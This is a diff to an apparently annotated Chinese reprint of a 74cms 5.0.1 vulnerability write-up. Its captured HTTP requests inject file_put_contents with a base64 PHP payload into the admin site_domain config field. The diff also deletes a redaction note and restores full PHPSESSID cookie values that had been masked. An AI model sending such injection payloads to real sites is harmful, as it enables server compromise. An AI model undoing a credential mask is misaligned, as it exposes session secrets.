@@ -20,13 +20,12 @@ schema_version: "1"
 
 ## 核对与使用边界
 
-- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
 
 本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
 
 适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：5.0.1; authenticated admin config edit; writable config file
 
-- **凭据与会话边界（1）**：Headline and empty introduction omit admin requirement visible in route/cookie。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。
+- **凭据与会话边界（1）**：Headline and empty introduction omit admin requirement visible in route/cookie。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。
 
 - **事实待核（2）**：Text incorrectly describes var_export as HTML entity conversion。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。
 
@@ -66,7 +65,7 @@ schema_version: "1"
     X-Requested-With: XMLHttpRequest
     Content-Length: 391
     Connection: close
-    Cookie: PHPSESSID=arm********************ph3; think_language=zh-CN; think_template=default
+    Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default
 
     site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&site_domain=127.0.0.1&site_dir=%2F74cms%2F&top_tel=000-00000000&bootom_tel=000-00000000&contact_email=&address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&icp=icp000000000&isclose=0&close_reason=&statistics=&logo_home=&logo_other=
 
@@ -277,7 +276,7 @@ file\_put\_contents(\'403.php\',base64\_decode(\'PD9waHAgcGhwaW5mbygpOz8+\')),\'
     X-Requested-With: XMLHttpRequest
     Content-Length: 465
     Connection: close
-    Cookie: PHPSESSID=arm********************ph3; think_language=zh-CN; think_template=default
+    Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default
 
     site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&site_domain='%2C+file_put_contents('403.php'%2Cbase64_decode('PD9waHAgcGhwaW5mbygpOz8%2B'))%2C'&site_dir=%2F74cms%2F&top_tel=000-00000000&bootom_tel=000-00000000&contact_email=&address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&icp=icp000000000&isclose=0&close_reason=&statistics=&logo_home=&logo_other=
     GET /74cms/Application/Common/Conf/url.php HTTP/1.1
@@ -287,7 +286,7 @@ file\_put\_contents(\'403.php\',base64\_decode(\'PD9waHAgcGhwaW5mbygpOz8+\')),\'
     Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
     Accept-Encoding: gzip, deflate
     Connection: close
-    Cookie: PHPSESSID=arm********************ph3; think_language=zh-CN; think_template=default
+    Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default
     Upgrade-Insecure-Requests: 1
     Cache-Control: max-age=0
 
